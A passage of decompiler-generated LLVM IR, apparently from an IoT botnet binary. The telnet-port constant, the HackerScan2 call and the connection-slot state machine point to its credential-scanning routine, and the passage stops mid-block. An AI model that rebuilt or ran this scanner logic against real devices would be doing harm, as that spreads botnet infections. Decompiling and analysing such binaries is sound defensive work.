  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-320 = alloca i32, align 4
  %stack_var_-600 = alloca i32, align 4
  %stack_var_-608 = alloca i32, align 4
  store i32 1000, i32* %eax.global-to-local, align 4
  %v2_804cffd = call i32 @__GI_time(i32* null)
  store i32 %v2_804cffd, i32* %eax.global-to-local, align 4
  store i32 %v2_804cffd, i32* @ebx, align 4
  %v1_804d004 = call i32 @rand_cmwc(i32 0)
  %v1_804d009 = load i32, i32* @ebx, align 4
  %v2_804d009 = xor i32 %v1_804d009, %v1_804d004
  store i32 %v2_804d009, i32* @eax, align 4
  %v1_804d00e = call i32 @srand(i32 %v2_804d009)
  store i32 %v1_804d00e, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-608, align 4
  %v2_804d023 = call i32 @htons(i16 23)
  %v2_804d032 = ptrtoint i32* %stack_var_-608 to i32
  %v15_804d038 = ptrtoint i32* %stack_var_-600 to i32
  store i32 %v15_804d038, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-600, align 4
  %v1_804d04f = call i32 @malloc(i32 1025)
  store i32 %v1_804d04f, i32* %edx.global-to-local, align 4
  store i32 1025, i32* %eax.global-to-local, align 4
  %v3_804d070 = inttoptr i32 %v1_804d04f to i8*
  %v4_804d070 = call i32 @__GI_memset(i8* %v3_804d070, i32 0, i32 1025)
  %v0_804d094 = load i32, i32* @esp, align 4
  %v1_804d0a6 = add i32 %v0_804d094, -27981
  %v2_804d0a9 = and i32 %v1_804d0a6, -16
  store i32 5000, i32* %edx.global-to-local, align 4
  %v1_804d0cc = inttoptr i32 %v2_804d0a9 to i8*
  store i32 %v2_804d0a9, i32* @edi, align 4
  %v1_804d0d1 = and i32 %v1_804d0a6, -256
  store i32 %v1_804d0d1, i32* %eax.global-to-local, align 4
  %v5_804d0d3 = call i8* @_memset(i8* %v1_804d0cc, i32 %v1_804d0d1, i32 5000)
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804d132 = or i32 %v2_804d0a9, 9
  br label %dec_label_pc_804d0de

dec_label_pc_804d0de:                             ; preds = %entry, %dec_label_pc_804d0de
  %storemerge245 = phi i32 [ 0, %entry ], [ %v4_804d157, %dec_label_pc_804d0de ]
  %v2_804d0f2 = mul nuw nsw i32 %storemerge245, 28
  %v2_804d0f4 = add i32 %v2_804d0f2, %v2_804d0a9
  store i32 %v2_804d0f4, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804d0fc = inttoptr i32 %v2_804d0f4 to i32*
  store i32 0, i32* %v2_804d0fc, align 4
  %v0_804d0fe = load i32, i32* %eax.global-to-local, align 4
  %v1_804d0fe = add i32 %v0_804d0fe, 4
  store i32 %v1_804d0fe, i32* %eax.global-to-local, align 4
  %v0_804d101 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d101 = inttoptr i32 %v1_804d0fe to i32*
  store i32 %v0_804d101, i32* %v2_804d101, align 4
  %v0_804d103 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d103 = add i32 %v0_804d103, 4
  store i32 %v1_804d103, i32* %eax.global-to-local, align 4
  %v0_804d106 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d106 = inttoptr i32 %v1_804d103 to i32*
  store i32 %v0_804d106, i32* %v2_804d106, align 4
  %v0_804d108 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d108 = add i32 %v0_804d108, 4
  store i32 %v1_804d108, i32* %eax.global-to-local, align 4
  %v0_804d10b = load i32, i32* %edx.global-to-local, align 4
  %v2_804d10b = inttoptr i32 %v1_804d108 to i32*
  store i32 %v0_804d10b, i32* %v2_804d10b, align 4
  %v0_804d10d = load i32, i32* %eax.global-to-local, align 4
  %v1_804d10d = add i32 %v0_804d10d, 4
  store i32 %v1_804d10d, i32* %eax.global-to-local, align 4
  %v0_804d110 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d110 = inttoptr i32 %v1_804d10d to i32*
  store i32 %v0_804d110, i32* %v2_804d110, align 4
  %v0_804d112 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d112 = add i32 %v0_804d112, 4
  store i32 %v1_804d112, i32* %eax.global-to-local, align 4
  %v0_804d115 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d115 = inttoptr i32 %v1_804d112 to i32*
  store i32 %v0_804d115, i32* %v2_804d115, align 4
  %v0_804d117 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d117 = add i32 %v0_804d117, 4
  %v0_804d11a = load i32, i32* %edx.global-to-local, align 4
  %v2_804d11a = inttoptr i32 %v1_804d117 to i32*
  store i32 %v0_804d11a, i32* %v2_804d11a, align 4
  %v3_804d132 = add i32 %v2_804d132, %v2_804d0f2
  %v4_804d132 = inttoptr i32 %v3_804d132 to i8*
  store i8 1, i8* %v4_804d132, align 1
  %v1_804d14f = add i32 %v2_804d0f4, 24
  store i32 %v1_804d14f, i32* %edx.global-to-local, align 4
  %v2_804d155 = inttoptr i32 %v1_804d14f to i32*
  store i32 %v1_804d04f, i32* %v2_804d155, align 4
  %v4_804d157 = add nuw nsw i32 %storemerge245, 1
  store i32 %v4_804d157, i32* %eax.global-to-local, align 4
  %v15_804d15d = icmp eq i32 %v4_804d157, 1000
  br i1 %v15_804d15d, label %dec_label_pc_804d166.preheader, label %dec_label_pc_804d0de

dec_label_pc_804d166.preheader:                   ; preds = %dec_label_pc_804d0de
  %v2_804d5e4 = ptrtoint i32* %stack_var_-320 to i32
  %tmp38 = bitcast i32* %stack_var_-320 to i8*
  %v2_804d664 = ptrtoint i32* %stack_var_-328 to i32
  %v2_804d6ca = ptrtoint i32* %stack_var_-332 to i32
  %v2_804d6d4 = ptrtoint i32* %stack_var_-336 to i32
  %v2_804d1d6 = or i32 %v2_804d0a9, 8
  %v2_804d307 = or i32 %v2_804d0a9, 11
  %v2_804d34e = or i32 %v2_804d0a9, 10
  %v2_804df1d = add i32 %v2_804d0a9, 16
  br label %dec_label_pc_804d166

dec_label_pc_804d166:                             ; preds = %dec_label_pc_804e324, %dec_label_pc_804d166.preheader
  %stack_var_-624.0 = phi i32 [ %tmp5, %dec_label_pc_804d166.preheader ], [ %stack_var_-624.1, %dec_label_pc_804e324 ]
  %stack_var_-628.0 = phi i32 [ %tmp4, %dec_label_pc_804d166.preheader ], [ %stack_var_-628.1, %dec_label_pc_804e324 ]
  br label %dec_label_pc_804d172

dec_label_pc_804d172:                             ; preds = %dec_label_pc_804d166, %dec_label_pc_804e324
  %storemerge = phi i32 [ 0, %dec_label_pc_804d166 ], [ %v4_804e324, %dec_label_pc_804e324 ]
  %storemerge43 = phi i32 [ 0, %dec_label_pc_804d166 ], [ %v4_804e324, %dec_label_pc_804e324 ]
  %stack_var_-628.242 = phi i32 [ %stack_var_-628.0, %dec_label_pc_804d166 ], [ %stack_var_-628.1, %dec_label_pc_804e324 ]
  %stack_var_-624.241 = phi i32 [ %stack_var_-624.0, %dec_label_pc_804d166 ], [ %stack_var_-624.1, %dec_label_pc_804e324 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_804d178 = mul nuw nsw i32 %storemerge43, 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  %v2_804d186 = mul nuw nsw i32 %storemerge43, 28
  %v2_804d188 = add i32 %v2_804d186, %v2_804d0a9
  %v1_804d18a = add i32 %v2_804d188, 16
  store i32 %v1_804d18a, i32* %eax.global-to-local, align 4
  %v1_804d18d = inttoptr i32 %v1_804d18a to i32*
  %v2_804d18d = load i32, i32* %v1_804d18d, align 4
  store i32 %v2_804d18d, i32* %eax.global-to-local, align 4
  %v1_804d18f = icmp eq i32 %v2_804d18d, 0
  %v1_804d191 = icmp eq i1 %v1_804d18f, false
  br i1 %v1_804d191, label %dec_label_pc_804d1c0, label %dec_label_pc_804d193

dec_label_pc_804d193:                             ; preds = %dec_label_pc_804d172
  store i32 %storemerge43, i32* @ebx, align 4
  %v0_804d196 = load i32, i32* @esp, align 4
  %v1_804d196 = inttoptr i32 %v0_804d196 to i32*
  store i32 0, i32* %v1_804d196, align 4
  %v1_804d19d = inttoptr i32 %storemerge43 to i32*
  %v2_804d19d = call i32 @__GI_time(i32* %v1_804d19d)
  store i32 %v2_804d19d, i32* @esi, align 4
  %v0_804d1a7 = load i32, i32* @ebx, align 4
  %v1_804d1a9 = mul i32 %v0_804d1a7, 4
  store i32 %v1_804d1a9, i32* %edx.global-to-local, align 4
  %v2_804d1b7 = mul i32 %v0_804d1a7, 28
  %v2_804d1b9 = add i32 %v2_804d1b7, %v2_804d0a9
  %v1_804d1bb = add i32 %v2_804d1b9, 16
  store i32 %v1_804d1bb, i32* %eax.global-to-local, align 4
  %v2_804d1be = inttoptr i32 %v1_804d1bb to i32*
  store i32 %v2_804d19d, i32* %v2_804d1be, align 4
  br label %dec_label_pc_804d1c0

dec_label_pc_804d1c0:                             ; preds = %dec_label_pc_804d172, %dec_label_pc_804d193
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v3_804d1d6 = add i32 %v2_804d1d6, %v2_804d186
  %v4_804d1d6 = inttoptr i32 %v3_804d1d6 to i8*
  %v5_804d1d6 = load i8, i8* %v4_804d1d6, align 4
  %v6_804d1d6 = zext i8 %v5_804d1d6 to i32
  store i32 %v6_804d1d6, i32* %eax.global-to-local, align 4
  store i32 %v6_804d1d6, i32* @edi, align 4
  %v1_804d1f7 = mul nuw nsw i32 %v6_804d1d6, 4
  %v2_804d1f7 = add nuw nsw i32 %v1_804d1f7, 134585256
  %v3_804d1f7 = inttoptr i32 %v2_804d1f7 to i32*
  %v4_804d1f7 = load i32, i32* %v3_804d1f7, align 4
  store i32 %v4_804d1f7, i32* %eax.global-to-local, align 4
  switch i8 %v5_804d1d6, label %dec_label_pc_804e324 [
    i8 0, label %dec_label_pc_804d200
    i8 1, label %dec_label_pc_804d5da
    i8 2, label %dec_label_pc_804d94e
    i8 3, label %dec_label_pc_804da83
    i8 4, label %dec_label_pc_804dbf2
    i8 5, label %dec_label_pc_804dd27
    i8 6, label %dec_label_pc_804de96
    i8 7, label %dec_label_pc_804e1bd
  ]

dec_label_pc_804d200:                             ; preds = %dec_label_pc_804d1c0
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v3_804d216 = add i32 %v2_804d132, %v2_804d186
  %v4_804d216 = inttoptr i32 %v3_804d216 to i8*
  %v5_804d216 = load i8, i8* %v4_804d216, align 1
  %v10_804d21b = icmp eq i8 %v5_804d216, 1
  %v1_804d21d = icmp eq i1 %v10_804d21b, false
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  br i1 %v1_804d21d, label %dec_label_pc_804d2cc, label %dec_label_pc_804d223

dec_label_pc_804d223:                             ; preds = %dec_label_pc_804d200
  %v1_804d23b = add i32 %v2_804d188, 24
  store i32 %v1_804d23b, i32* %eax.global-to-local, align 4
  %v1_804d23e = inttoptr i32 %v1_804d23b to i32*
  %v2_804d23e = load i32, i32* %v1_804d23e, align 4
  store i32 %v2_804d188, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804d261 = inttoptr i32 %v2_804d188 to i32*
  store i32 0, i32* %v2_804d261, align 4
  %v0_804d263 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d263 = add i32 %v0_804d263, 4
  store i32 %v1_804d263, i32* %eax.global-to-local, align 4
  %v0_804d266 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d266 = inttoptr i32 %v1_804d263 to i32*
  store i32 %v0_804d266, i32* %v2_804d266, align 4
  %v0_804d268 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d268 = add i32 %v0_804d268, 4
  store i32 %v1_804d268, i32* %eax.global-to-local, align 4
  %v0_804d26b = load i32, i32* %edx.global-to-local, align 4
  %v2_804d26b = inttoptr i32 %v1_804d268 to i32*
  store i32 %v0_804d26b, i32* %v2_804d26b, align 4
  %v0_804d26d = load i32, i32* %eax.global-to-local, align 4
  %v1_804d26d = add i32 %v0_804d26d, 4
  store i32 %v1_804d26d, i32* %eax.global-to-local, align 4
  %v0_804d270 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d270 = inttoptr i32 %v1_804d26d to i32*
  store i32 %v0_804d270, i32* %v2_804d270, align 4
  %v0_804d272 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d272 = add i32 %v0_804d272, 4
  store i32 %v1_804d272, i32* %eax.global-to-local, align 4
  %v0_804d275 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d275 = inttoptr i32 %v1_804d272 to i32*
  store i32 %v0_804d275, i32* %v2_804d275, align 4
  %v0_804d277 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d277 = add i32 %v0_804d277, 4
  store i32 %v1_804d277, i32* %eax.global-to-local, align 4
  %v0_804d27a = load i32, i32* %edx.global-to-local, align 4
  %v2_804d27a = inttoptr i32 %v1_804d277 to i32*
  store i32 %v0_804d27a, i32* %v2_804d27a, align 4
  %v0_804d27c = load i32, i32* %eax.global-to-local, align 4
  %v1_804d27c = add i32 %v0_804d27c, 4
  %v0_804d27f = load i32, i32* %edx.global-to-local, align 4
  %v2_804d27f = inttoptr i32 %v1_804d27c to i32*
  store i32 %v0_804d27f, i32* %v2_804d27f, align 4
  store i32 %v1_804d23b, i32* %edx.global-to-local, align 4
  store i32 %v2_804d23e, i32* @eax, align 4
  store i32 %v2_804d23e, i32* %v1_804d23e, align 4
  store i32 %storemerge43, i32* @ebx, align 4
  %v1_804d2a4 = call i32 @HackerScan2(i32 %v6_804d1d6)
  %v0_804d2ae = load i32, i32* @ebx, align 4
  %v1_804d2b0 = mul i32 %v0_804d2ae, 4
  store i32 %v1_804d2b0, i32* %edx.global-to-local, align 4
  %v2_804d2be = mul i32 %v0_804d2ae, 28
  %v2_804d2c0 = add i32 %v2_804d2be, %v2_804d0a9
  %v1_804d2c2 = add i32 %v2_804d2c0, 4
  store i32 %v1_804d2c2, i32* %eax.global-to-local, align 4
  %v2_804d2c5 = inttoptr i32 %v1_804d2c2 to i32*
  store i32 %v1_804d2a4, i32* %v2_804d2c5, align 4
  br label %dec_label_pc_804d3fb

dec_label_pc_804d2cc:                             ; preds = %dec_label_pc_804d200
  %v5_804d2e2 = load i8, i8* %v4_804d216, align 1
  %v6_804d2e2 = zext i8 %v5_804d2e2 to i32
  store i32 %v6_804d2e2, i32* %eax.global-to-local, align 4
  %v4_804d2e7 = icmp eq i8 %v5_804d2e2, 0
  %v1_804d2e9 = icmp eq i1 %v4_804d2e7, false
  br i1 %v1_804d2e9, label %dec_label_pc_804d3fb, label %dec_label_pc_804d2ef

dec_label_pc_804d2ef:                             ; preds = %dec_label_pc_804d2cc
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v3_804d307 = add i32 %v2_804d307, %v2_804d186
  %v4_804d307 = inttoptr i32 %v3_804d307 to i8*
  %v5_804d307 = load i8, i8* %v4_804d307, align 1
  %v2_804d30e = add i8 %v5_804d307, 1
  store i8 %v2_804d30e, i8* %v4_804d307, align 1
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v3_804d34e = add i32 %v2_804d34e, %v2_804d186
  %v4_804d34e = inttoptr i32 %v3_804d34e to i8*
  %v5_804d34e = load i8, i8* %v4_804d34e, align 2
  %v2_804d355 = add i8 %v5_804d34e, 1
  store i8 %v2_804d355, i8* %v4_804d34e, align 2
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v5_804d393 = load i8, i8* %v4_804d307, align 1
  %v10_804d398 = icmp eq i8 %v5_804d393, 3
  %v1_804d39a = icmp eq i1 %v10_804d398, false
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  br i1 %v1_804d39a, label %dec_label_pc_804d3bc, label %dec_label_pc_804d39c

dec_label_pc_804d39c:                             ; preds = %dec_label_pc_804d2ef
  store i8 1, i8* %v4_804d216, align 1
  br label %dec_label_pc_804e324

dec_label_pc_804d3bc:                             ; preds = %dec_label_pc_804d2ef
  %v5_804d3d2 = load i8, i8* %v4_804d34e, align 2
  %v6_804d3d2 = zext i8 %v5_804d3d2 to i32
  store i32 %v6_804d3d2, i32* %eax.global-to-local, align 4
  %v10_804d3d7 = icmp eq i8 %v5_804d3d2, 3
  %v1_804d3d9 = icmp eq i1 %v10_804d3d7, false
  br i1 %v1_804d3d9, label %dec_label_pc_804d3fb, label %dec_label_pc_804d3db

dec_label_pc_804d3db:                             ; preds = %dec_label_pc_804d3bc
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804d216, align 1
  br label %dec_label_pc_804e324

dec_label_pc_804d3fb:                             ; preds = %dec_label_pc_804d3bc, %dec_label_pc_804d2cc, %dec_label_pc_804d223
  store i32 2, i32* %stack_var_-608, align 4
  %v0_804d404 = load i32, i32* @esp, align 4
  %v1_804d404 = inttoptr i32 %v0_804d404 to i32*
  store i32 23, i32* %v1_804d404, align 4
  %v0_804d40b = load i32, i32* %stack_var_-608, align 4
  %v1_804d40b = trunc i32 %v0_804d40b to i16
  %v2_804d40b = call i32 @htons(i16 %v1_804d40b)
  store i32 0, i32* %stack_var_-600, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  %v1_804d448 = add i32 %v2_804d188, 4
  store i32 %v1_804d448, i32* %eax.global-to-local, align 4
  %v1_804d44b = inttoptr i32 %v1_804d448 to i32*
  %v2_804d44b = load i32, i32* %v1_804d44b, align 4
  store i32 %v2_804d44b, i32* %eax.global-to-local, align 4
  store i32 %storemerge43, i32* @ebx, align 4
  %v0_804d456 = load i32, i32* @esp, align 4
  %v1_804d456 = add i32 %v0_804d456, 8
  %v2_804d456 = inttoptr i32 %v1_804d456 to i32*
  store i32 0, i32* %v2_804d456, align 4
  %v0_804d45e = load i32, i32* @esp, align 4
  %v1_804d45e = add i32 %v0_804d45e, 4
  %v2_804d45e = inttoptr i32 %v1_804d45e to i32*
  store i32 1, i32* %v2_804d45e, align 4
  %v0_804d466 = load i32, i32* @esp, align 4
  %v1_804d466 = inttoptr i32 %v0_804d466 to i32*
  store i32 2, i32* %v1_804d466, align 4
  %v2_804d46d = load i32, i32* %stack_var_-600, align 4
  %sext = mul i32 %v2_804d40b, 65536
  %v3_804d46d = sdiv i32 %sext, 65536
  %v4_804d46d = call i32 @socket(i32 %v3_804d46d, i32 %v2_804d44b, i32 %v2_804d46d)
  store i32 %v4_804d46d, i32* @esi, align 4
  %v0_804d477 = load i32, i32* @ebx, align 4
  %v2_804d487 = mul i32 %v0_804d477, 28
  %v3_804d489 = add i32 %v2_804d487, %v2_804d0a9
  %v4_804d489 = inttoptr i32 %v3_804d489 to i32*
  store i32 %v4_804d46d, i32* %v4_804d489, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v3_804d4a2 = inttoptr i32 %v2_804d188 to i32*
  %v4_804d4a2 = load i32, i32* %v3_804d4a2, align 4
  store i32 %v4_804d4a2, i32* %eax.global-to-local, align 4
  %v10_804d4a5 = icmp eq i32 %v4_804d4a2, -1
  br i1 %v10_804d4a5, label %dec_label_pc_804e324, label %dec_label_pc_804d4ae

dec_label_pc_804d4ae:                             ; preds = %dec_label_pc_804d3fb
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v4_804d4c4 = load i32, i32* %v3_804d4a2, align 4
  store i32 %v4_804d4c4, i32* %eax.global-to-local, align 4
  %v0_804d4c7 = load i32, i32* @esp, align 4
  %v1_804d4c7 = add i32 %v0_804d4c7, 8
  %v2_804d4c7 = inttoptr i32 %v1_804d4c7 to i32*
  store i32 0, i32* %v2_804d4c7, align 4
  %v0_804d4cf = load i32, i32* @esp, align 4
  %v1_804d4cf = add i32 %v0_804d4cf, 4
  %v2_804d4cf = inttoptr i32 %v1_804d4cf to i32*
  store i32 3, i32* %v2_804d4cf, align 4
  %v0_804d4d7 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d4d7 = load i32, i32* @esp, align 4
  %v2_804d4d7 = inttoptr i32 %v1_804d4d7 to i32*
  store i32 %v0_804d4d7, i32* %v2_804d4d7, align 4
  %v1_804d4da = load i32, i32* %stack_var_-600, align 4
  %v3_804d4da = call i32 @__libc_fcntl(i32 %v2_804d44b, i32 %v1_804d4da, i32 0)
  %v1_804d4e1 = or i32 %v3_804d4da, 2048
  store i32 %v1_804d4e1, i32* @ebx, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v4_804d4fd = load i32, i32* %v3_804d4a2, align 4
  store i32 %v4_804d4fd, i32* %eax.global-to-local, align 4
  %v1_804d500 = load i32, i32* @esp, align 4
  %v2_804d500 = add i32 %v1_804d500, 8
  %v3_804d500 = inttoptr i32 %v2_804d500 to i32*
  store i32 %v1_804d4e1, i32* %v3_804d500, align 4
  %v0_804d504 = load i32, i32* @esp, align 4
  %v1_804d504 = add i32 %v0_804d504, 4
  %v2_804d504 = inttoptr i32 %v1_804d504 to i32*
  store i32 4, i32* %v2_804d504, align 4
  %v0_804d50c = load i32, i32* %eax.global-to-local, align 4
  %v1_804d50c = load i32, i32* @esp, align 4
  %v2_804d50c = inttoptr i32 %v1_804d50c to i32*
  store i32 %v0_804d50c, i32* %v2_804d50c, align 4
  %v1_804d50f = load i32, i32* %stack_var_-600, align 4
  %v3_804d50f = call i32 @__libc_fcntl(i32 %v2_804d44b, i32 %v1_804d50f, i32 0)
  store i32 %v2_804d032, i32* @ebx, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v4_804d530 = load i32, i32* %v3_804d4a2, align 4
  store i32 %v4_804d530, i32* %eax.global-to-local, align 4
  %v0_804d533 = load i32, i32* @esp, align 4
  %v1_804d533 = add i32 %v0_804d533, 8
  %v2_804d533 = inttoptr i32 %v1_804d533 to i32*
  store i32 16, i32* %v2_804d533, align 4
  %v1_804d53b = load i32, i32* @esp, align 4
  %v2_804d53b = add i32 %v1_804d53b, 4
  %v3_804d53b = inttoptr i32 %v2_804d53b to i32*
  store i32 %v2_804d032, i32* %v3_804d53b, align 4
  %v0_804d53f = load i32, i32* %eax.global-to-local, align 4
  %v1_804d53f = load i32, i32* @esp, align 4
  %v2_804d53f = inttoptr i32 %v1_804d53f to i32*
  store i32 %v0_804d53f, i32* %v2_804d53f, align 4
  %v1_804d542 = load i32, i32* %stack_var_-600, align 4
  %v3_804d542 = call i32 @__libc_connect(i32 %v2_804d44b, i32 %v1_804d542, i32 0)
  store i32 %v3_804d542, i32* %eax.global-to-local, align 4
  %v10_804d547 = icmp eq i32 %v3_804d542, -1
  %v1_804d54a = icmp eq i1 %v10_804d547, false
  br i1 %v1_804d54a, label %dec_label_pc_804d599, label %dec_label_pc_804d54c

dec_label_pc_804d54c:                             ; preds = %dec_label_pc_804d4ae
  %v1_804d54c = call i32 @__errno_location(i32 %v2_804d44b)
  store i32 %v1_804d54c, i32* %eax.global-to-local, align 4
  %v1_804d551 = inttoptr i32 %v1_804d54c to i32*
  %v2_804d551 = load i32, i32* %v1_804d551, align 4
  store i32 %v2_804d551, i32* %eax.global-to-local, align 4
  %v9_804d553 = icmp eq i32 %v2_804d551, 115
  br i1 %v9_804d553, label %dec_label_pc_804d599, label %dec_label_pc_804d558

dec_label_pc_804d558:                             ; preds = %dec_label_pc_804d54c
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v4_804d56e = load i32, i32* %v3_804d4a2, align 4
  store i32 %v4_804d56e, i32* %eax.global-to-local, align 4
  %v1_804d571 = load i32, i32* @esp, align 4
  %v2_804d571 = inttoptr i32 %v1_804d571 to i32*
  store i32 %v4_804d56e, i32* %v2_804d571, align 4
  %v1_804d574 = call i32 @sclose(i32 %v2_804d44b)
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804d216, align 1
  br label %dec_label_pc_804e324

dec_label_pc_804d599:                             ; preds = %dec_label_pc_804d54c, %dec_label_pc_804d4ae
  store i8 1, i8* %v4_804d1d6, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v1_804d18a, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804d18d, align 4
  br label %dec_label_pc_804e324

dec_label_pc_804d5da:                             ; preds = %dec_label_pc_804d1c0
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804d5e4, i32* @edi, align 4
  %v5_804d5eb = call i8* @_memset(i8* %tmp38, i32 0, i32 32)
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v3_804d609 = inttoptr i32 %v2_804d188 to i32*
  %v4_804d609 = load i32, i32* %v3_804d609, align 4
  %v2_804d60e = udiv i32 %v4_804d609, 32
  store i32 %v2_804d60e, i32* @ebx, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v4_804d627 = load i32, i32* %v3_804d609, align 4
  %v1_804d62a = urem i32 %v4_804d627, 32
  store i32 %v1_804d62a, i32* %eax.global-to-local, align 4
  %v0_804d62d = load i32, i32* @ebp, align 4
  %v2_804d62d = mul nuw nsw i32 %v2_804d60e, 4
  %v3_804d62d = add nsw i32 %v2_804d62d, -316
  %v4_804d62d = add i32 %v3_804d62d, %v0_804d62d
  %v5_804d62d = inttoptr i32 %v4_804d62d to i32*
  %v6_804d62d = load i32, i32* %v5_804d62d, align 4
  %v9_804d62d = shl i32 1, %v1_804d62a
  %v12_804d62d = or i32 %v6_804d62d, %v9_804d62d
  store i32 %v12_804d62d, i32* %v5_804d62d, align 4
  store i32 0, i32* %stack_var_-328, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v4_804d65e = load i32, i32* %v3_804d609, align 4
  %v1_804d661 = add i32 %v4_804d65e, 1
  store i32 %v1_804d661, i32* %edx.global-to-local, align 4
  %v1_804d66a = load i32, i32* @esp, align 4
  %v2_804d66a = add i32 %v1_804d66a, 16
  %v3_804d66a = inttoptr i32 %v2_804d66a to i32*
  store i32 %v2_804d664, i32* %v3_804d66a, align 4
  %v0_804d66e = load i32, i32* @esp, align 4
  %v1_804d66e = add i32 %v0_804d66e, 12
  %v2_804d66e = inttoptr i32 %v1_804d66e to i32*
  store i32 0, i32* %v2_804d66e, align 4
  store i32 %v2_804d5e4, i32* %eax.global-to-local, align 4
  %v1_804d67c = load i32, i32* @esp, align 4
  %v2_804d67c = add i32 %v1_804d67c, 8
  %v3_804d67c = inttoptr i32 %v2_804d67c to i32*
  store i32 %v2_804d5e4, i32* %v3_804d67c, align 4
  %v0_804d680 = load i32, i32* @esp, align 4
  %v1_804d680 = add i32 %v0_804d680, 4
  %v2_804d680 = inttoptr i32 %v1_804d680 to i32*
  store i32 0, i32* %v2_804d680, align 4
  %v0_804d688 = load i32, i32* %edx.global-to-local, align 4
  %v1_804d688 = load i32, i32* @esp, align 4
  %v2_804d688 = inttoptr i32 %v1_804d688 to i32*
  store i32 %v0_804d688, i32* %v2_804d688, align 4
  %v0_804d68b = load i32, i32* %stack_var_-328, align 4
  %v2_804d68b = load i32, i32* %stack_var_-320, align 4
  %v5_804d68b = call i32 @__libc_select(i32 %v0_804d68b, i32 10, i32 %v2_804d68b, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804d68b, i32* %eax.global-to-local, align 4
  %v12_804d693 = icmp eq i32 %v5_804d68b, 1
  %v1_804d697 = icmp eq i1 %v12_804d693, false
  br i1 %v1_804d697, label %dec_label_pc_804d85c, label %dec_label_pc_804d69d

dec_label_pc_804d69d:                             ; preds = %dec_label_pc_804d5da
  store i32 4, i32* %stack_var_-332, align 4
  store i32 0, i32* %stack_var_-336, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v4_804d6c7 = load i32, i32* %v3_804d609, align 4
  store i32 %v4_804d6c7, i32* %edx.global-to-local, align 4
  %v1_804d6d0 = load i32, i32* @esp, align 4
  %v2_804d6d0 = add i32 %v1_804d6d0, 16
  %v3_804d6d0 = inttoptr i32 %v2_804d6d0 to i32*
  store i32 %v2_804d6ca, i32* %v3_804d6d0, align 4
  store i32 %v2_804d6d4, i32* %eax.global-to-local, align 4
  %v1_804d6da = load i32, i32* @esp, align 4
  %v2_804d6da = add i32 %v1_804d6da, 12
  %v3_804d6da = inttoptr i32 %v2_804d6da to i32*
  store i32 %v2_804d6d4, i32* %v3_804d6da, align 4
  %v0_804d6de = load i32, i32* @esp, align 4
  %v1_804d6de = add i32 %v0_804d6de, 8
  %v2_804d6de = inttoptr i32 %v1_804d6de to i32*
